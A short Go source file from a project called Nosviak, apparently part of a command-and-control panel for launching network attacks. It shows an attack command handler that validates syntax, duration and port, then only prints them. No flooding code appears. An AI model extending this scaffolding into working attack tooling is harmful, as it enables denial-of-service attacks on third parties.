package attacks

import (
	"fmt"
	"strconv"

	"Nosviak/core/models/views"
)

//creates a new attack vendor
//this will correctly perform all the attacks building upto the attack
func (attack *Attack) PerformAttack() error {

	//validates the syntax passed
	//this will correctly make sure the syntax given is valid
	err := attack.CheckSyntax()

	//error handles the syntax
	//makes sure the syntax given is valid
	if err != nil {
		//makes sure we return the error
		//this will return the error properly
		return err
	}

	//validates the duration
	//this will make sure the duration asked for is valid and useable
	Duration, err := strconv.Atoi(attack.Command[2])

	//err handles the invalid duration information
	//this makes sure the duration is valid & useable
	if err != nil {
		//renders the invalid duration information
		return views.NewDTX("attacks-duration-invalidType.dtx", attack.session.Write).RegisterVariable("duration", attack.Command[2]).Template(attack.session, attack.session.Channel)
	}

	//validates the incoming port
	//this will either check if the port is there and use that
	//or just return the default port
	Port, err := attack.ValidatePort()
	
	//err handles the statement
	//makes sure the statement doesn't err out
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	fmt.Println(Duration, Port)

	return nil
}